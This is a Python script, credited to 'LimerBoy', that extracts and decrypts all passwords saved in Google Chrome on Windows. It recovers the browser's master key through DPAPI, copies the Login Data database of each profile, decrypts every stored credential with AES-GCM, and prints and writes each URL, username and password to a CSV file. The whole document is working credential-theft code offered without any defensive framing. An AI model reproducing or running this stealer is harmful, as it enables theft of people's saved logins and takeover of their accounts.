#Full Credits to LimerBoy
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

# Global Constants
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])

def get_secret_key():
    try:
        # Get secret key from Chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome secret key cannot be found")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
        print("[ERR] Unable to decrypt. Chrome version <80 is not supported.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome database cannot be found")
        return None

if __name__ == '__main__':
    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file)
            csv_writer.writerow(["index", "url", "username", "password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login
                        if url and username and ciphertext:
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print(f"Sequence: {index}")
                            print(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*' * 50}")
                            csv_writer.writerow([index, url, username, decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print(f"[ERR] {str(e)}")
